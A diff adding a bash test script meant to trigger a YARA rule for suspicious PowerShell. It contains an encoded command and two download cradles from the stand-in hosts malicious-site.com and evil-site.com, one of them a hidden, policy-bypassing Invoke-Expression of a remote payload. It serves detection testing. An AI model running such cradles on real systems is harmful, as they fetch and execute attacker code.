@@ -1,0 +1,16 @@
+#!/bin/bash
+# Suspicious PowerShell Test File
+# This file contains patterns that will trigger YARA detection
+
+echo "Starting suspicious PowerShell operations..."
+
+# This will trigger the Suspicious_PowerShell_Commands rule
+powershell -EncodedCommand "SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
+
+# Additional suspicious patterns
+powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')"
+
+# More PowerShell suspicious activity
+pwsh -Command "WebClient.DownloadString('http://evil-site.com/malware.txt')"
+
+echo "Suspicious operations completed"
